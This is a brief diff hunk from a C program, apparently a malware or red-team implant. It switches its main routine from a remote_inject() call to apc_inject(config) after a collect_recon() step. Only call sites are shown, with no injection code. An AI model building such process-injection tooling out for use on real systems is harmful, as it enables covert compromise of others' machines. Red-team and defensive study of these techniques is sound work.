@@ -13,8 +13,8 @@ int main(VOID)
 	collect_recon();
 
 	//inject_self(config);
-	remote_inject();
-
+	//remote_inject();
+	apc_inject(config);
 
 	return 0;
 
